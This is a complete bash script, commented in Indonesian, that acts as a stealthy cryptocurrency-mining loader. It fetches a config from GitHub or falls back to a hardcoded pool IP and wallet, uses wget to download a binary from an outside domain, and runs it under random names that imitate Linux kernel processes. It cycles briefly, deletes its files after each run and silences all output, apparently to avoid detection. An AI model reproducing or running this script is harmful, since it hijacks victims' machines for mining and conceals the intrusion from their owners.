#!/bin/bash

# URL untuk download config dari GitHub
GITHUB_URL="https://raw.githubusercontent.com/nineasku55/store/refs/heads/main/config.json"

# Config fallback jika GitHub down
FALLBACK_CONFIG_JSON='{
  "algo": "power2b",
  "url": "170.64.157.141:443",
  "user": "mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabaran888",
  "pass": "x",
  "threads": 8
}'

# Daftar nama proses Linux core yang lebih beragam
POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")

# Lokasi penyimpanan
LOCAL_BIN_DIR="$HOME/.local/bin"
mkdir -p "$LOCAL_BIN_DIR"

# Fungsi untuk generate string acak
generate_random_string() {
    local length=${1:-8}
    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
}

# Fungsi untuk download config dari GitHub
download_config_from_github() {
    local config_path="$1"
    
    # Download config dari GitHub
    if curl -s -L "$GITHUB_URL" -o "$config_path" --connect-timeout 15 >/dev/null 2>&1; then
        # Verifikasi bahwa config adalah JSON valid
        if jq empty "$config_path" 2>/dev/null; then
            return 0
        else
            return 1
        fi
    else
        return 1
    fi
}

# Fungsi fallback jika GitHub down
create_fallback_config() {
    local config_path="$1"
    echo "$FALLBACK_CONFIG_JSON" > "$config_path"
}

while true; do
    # Hapus data sesi lama termasuk config
    rm -f "$LOCAL_BIN_DIR"/*.json >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/migration* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/watchdog* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/rcu_* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/.profile-cache* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/kdevtmpfs* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/kintegrityd* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/kblockd* >/dev/null 2>&1
    rm -f "$LOCAL_BIN_DIR"/kthrotld* >/dev/null 2>&1

    # Pilih nama binary acak dari daftar
    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
    
    # Tambahkan string acak untuk membuat nama lebih unik
    RAND_SUFFIX=$(generate_random_string 12)
    BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
    
    # Buat nama config dengan suffix acak
    CONFIG_SUFFIX=$(generate_random_string 10)
    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config${CONFIG_SUFFIX}.json"

    # Download config JSON dari GitHub
    if ! download_config_from_github "$CONFIG_PATH"; then
        # Jika gagal, buat config fallback
        create_fallback_config "$CONFIG_PATH"
    fi

    # Download binary baru
    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL" >/dev/null 2>&1
    
    # Pastikan download berhasil sebelum melanjutkan
    if [ $? -ne 0 ]; then
        sleep 30
        continue
    fi
    
    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_FULL" >/dev/null 2>&1

    # Tentukan waktu aktif (2-3 menit)
    ACTIVE_MIN=$((RANDOM % 2 + 2))
    ACTIVE_SEC=$((ACTIVE_MIN * 60))

    # Tentukan waktu istirahat (20-30 detik)
    IDLE_SEC=$((RANDOM % 11 + 20))

    # Jalankan proses dengan timeout
    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_FULL" --config="$CONFIG_PATH" >/dev/null 2>&1

    # Hapus binary dan config setelah digunakan
    rm -f "$LOCAL_BIN_DIR/$BIN_NAME_FULL" >/dev/null 2>&1
    rm -f "$CONFIG_PATH" >/dev/null 2>&1

    # Istirahat
    sleep "$IDLE_SEC"
done
